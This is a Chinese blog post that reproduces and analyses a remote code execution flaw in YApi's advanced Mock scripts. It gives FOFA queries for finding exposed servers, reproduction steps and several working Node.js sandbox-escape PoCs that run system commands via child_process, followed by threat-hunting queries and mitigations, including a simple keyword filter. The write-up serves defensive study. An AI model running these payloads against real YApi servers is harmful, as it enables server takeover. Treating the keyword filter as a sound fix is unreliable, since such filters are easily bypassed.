# 003-Yapi Mock RCE 漏洞复现分析


<!--more-->

全文共计2314字，预计时长6分钟。

![图片](/resource/Yapi_Mock_RCE.assets/640.jpeg)

## 0x01 基本信息

**漏洞名称** : YAPI远程代码执行漏洞

**组件名称** : YAPI

**影响范围** : YAPI <= 1.9.2，

**漏洞类型** :远程代码执行

**利用条件** :

​	1、用户认证：需要用户认证

​	2、触发方式：远程

**综合评价 :** 

​	<综合评定利用难度>：中等，需要用户认证。

​	<综合评定威胁等级>：高危，能造成远程代码执行。

​	YAPI是由去哪儿网移动架构组(简称YMFE，一群由FE、iOS和Android工程师共同组成的具想象力、创造力和影响力的大前端团队)开发的可视化接口管理工具，是一个可本地部署的、打通前后端及QA的接口管理平台。

​	YAPI旨在为开发、产品和测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布和维护不同项目，不同平台的API。

​	YApi 提供了编写JS 脚本方式来提供自定义mock功能，JS脚本运行在NodeJs沙盒上，由于官方的沙盒只是为了隔离上下文，并不提供任何安全保证；mock脚本自定义服务未对JS脚本加以命令过滤，用户可以添加任何请求处理脚本，攻击者可利用该漏洞在受影响的服务器上执行任意javascript代码，通过精心构造的Javascript代码可以绕过沙盒并用于执行任意系统命令，从而导致远程代码执行漏洞，最终导致接管并控制服务器。

由于Yapi管理平台默认开放注册，攻击者可以在进行简单的注册之后，**构造恶意的JS代码绕过沙盒**，最终造成远程代码执行进行漏洞利用。

​	问题的本质：功能滥用，JS沙箱绕过导致远程代码执行

## 0x02 漏洞复现

fofa 搜索语句：

> icon_hash="-715193973"
>
> app="YApi"

本地复现：

​	Docker搭建测试环境，参考文档：[《Yapi+Docker的安装与配置》](https://blog.csdn.net/qq_32447301/article/details/81394024)

![图片](/resource/Yapi_Mock_RCE.assets/640-20230217124803801.png)

​	创建完容器之后就可以使用了。

1. 在首页下方找到登录/注册功能接口，或直接访问 /login 路径进行登录和注册。
2. 登录之后进入个人空间，在右侧点击添加项目；
3. 添加成功后进入项目，点击右侧同一位置有个“添加接口”
4. 添加完之后，打开接口，进入“高级Mock”功能，点击脚本，输入Poc，点击保存即可。
5. 点击“预览”，访问Mock地址，即可触发漏洞POC。

![图片](/resource/Yapi_Mock_RCE.assets/640-20230217124803366.png)

POC如下：

```
const process = this.constructor.constructor('return process')()mockJson = process.mainModule.require("child_process").execSync("whoami").toString()
```

点击“预览”，访问Mock地址，即可触发漏洞POC：

![图片](/resource/Yapi_Mock_RCE.assets/640-20230217124803369.png)

## 0x03 漏洞分析 

​	这个漏洞的利用条件首先需要用户通过认证，而YAPI 支持任意用户的注册功能，

​	注册之后的用户虽然没有任何分组与项目的权限，因此只能搜索、浏览 “公开项目” 的接口。但是新用户登录拥有 `个人空间` 分组下的**全部权限**，个人空间分组仅自己可见，因此可以在这里**任意试用 YApi 的功能**。

​	这里也就包括了高级Mock功能，该功能的本意是方便用户编写自己的JS脚本，该脚本将会运行在NodeJS沙盒上，但是NodeJS沙盒并不提供安全保证。关于JS沙箱的安全问题早有探讨。（见 《说说JS中的沙箱》——腾讯IVWEB团队）

​	NodeJS中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。

```
 const vm = require('vm'); const x = 1; const sandbox = {x:2}; vm.createContext(sandbox);  //Contextify the sandbox.  const code = 'x += 40;var y=17;'; vm.runInContext(code,sandbox); console.log(sandbox.x);  // 42 console.log(sandbox.y);  // 17 console.log(x);// 1; y is not defined.
```

​	vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。

​	可惜的是 如果这样，我们可以用原型链绕过，如下

```
 const vm = require('vm');   vm.runInNewContext("this.constructor.constructor('return process')().exit()")
```

​	网上关于NodeJS、沙箱一类的安全技术研究也有很多，可以参考下学一学。

​	回到这个漏洞，已知Mock脚本会在沙箱中运行，那么我们只需要利用类似上面的原型链进行绕过，退出沙箱，再构造调用命令即可。

Poc：

```
 const process = this.constructor.constructor('return process')() mockJson = process.mainModule.require("child_process").execSync("whoami").toString()
```

​	注意，这里不需要加 exit，加了以后yapi服务会退出。

网上的Poc其实表达的意思是一样的，如下：

```
 const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor('return process') const process = myfun() mockJson = process.mainModule.require("child_process").execSync("whoami").toString()
```

我认为这个问题的本质是功能的滥用，JS沙箱绕过导致远程代码执行。之前看了一个文档《nodejs命令执行和沙箱安全》，他所说的内容有对也有不对的地方。

​	作者认为这是一个正常的功能， “很多安全人员没深入开发或者是结合到sdl中，所以对这些需求的理解不深刻。那么假设我们要执行这个需求，这个需求就是要执行任意命令，因为业务会有千奇百怪的需求，前端nodejs就要执行命令来测试的。”，我虽然也是脱离业务的安全人员，但也相信确实存在各种乱七八糟的需求，执行命令也确实有它的客观需要。

​	但文章作者认为这个正常的功能，不需要修复，我觉得不对。

​	Mock 提供的JS脚本确实是正常的功能，但是不是真的需要给任何人都开放这个权限呢？

​	我认为这是一个功能的滥用，Mock的初衷是好的，但是却容易导致被攻击者恶意利用，造成的危害是重大的。安全是一门平衡的艺术，是为了保障业务持续稳定安全的运行。这次的问题还是侧重在用户权限上，官方允许新用户登录拥有 `个人空间` 分组下的**全部权限**，可以在这里**任意试用 YApi 的功能**，这样任何人都可以运行Mock脚本，继而间接导致任何人都可以控制服务器权限，这是存在安全隐患的。

​	我认为或许可以进行平衡，限制普通用户的权限，只允许可信的人来操作，对权限进行完善划分，对于可以控制服务器、执行系统命令的这些高危操作应当予以限制等。

​	不过，这也这是一个脱离业务的安全人员的粗浅想法，要根据实际进行处理。

​	感觉又是一个蜜罐素材？

## 0x04 威胁排查

1、使用管理员账号登录YAPI，在用户管理中排查并删除异常用户。

![图片](/resource/Yapi_Mock_RCE.assets/640-20230217124803425.png)

2、通过关键字（process、exec、require等），在adv_mock集合的mock_script域中搜索是否存在恶意的javascript脚本。

```
db.adv_mock.find({mock_script: /exec/});
```

![图片](/resource/Yapi_Mock_RCE.assets/640-20230217124803418.png)

出自：[《【处置手册】YAPI远程代码执行0day漏洞》](https://mp.weixin.qq.com/s?__biz=Mzk0MjE3ODkxNg==&mid=2247485888&idx=1&sn=3db5bf89f7f214859c0c37bf4340fa3a&scene=21#wechat_redirect)



## 0x05 缓解措施

目前官方暂未针对该漏洞发布修复方案，请受影响的用户参考下列措施进行防护：**1、关闭YAPI用户注册功能**

在 config.json 中添加以下配置项，禁止用户注册或启用LDAP认证：

```
 {
    "closeRegister":true
 }
```

修改完成后，重启 YAPI 服务生效。

**2、关闭YAPI Mock功能**

1)、在config.json中新增mock: false参数：  `{ ... "mock": false, }`

2)、在`exts/yapi-plugin-andvanced-mock/server.js`文件中找到：

  `if (caseData &&   caseData.case_enable) {...}`

并添加下列代码：

  `if(!yapi.WEBCONFIG.mock) { return   false; }`

**3、对高级Mock功能进行关键字过滤**  

在`/server/utils/commons.js`文件中找到：

 `sandbox =   yapi.commons.sandbox(sandbox, script);`

并添加下列代码：

```
 const filter = '/process|exec|require/g'; 
 const reg = new RegExp(filter, "g");   
 if(reg.test(script)) { return false; }
```

**4、对YAPI平台的访问进行限制**

利用请求白名单的方式限制 YAPI 相关端口

**5、修改管理员默认账号口令，清除弱口令。**

**6、检查删除恶意账户**

及时检查删除恶意账户，同步删除恶意用户创建的接口以及他们上传的恶意mock脚本以防止二次攻击。


---

> 作者: Xavier  
> URL: https://www.bthoughts.top/posts/yapi-mock-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/  

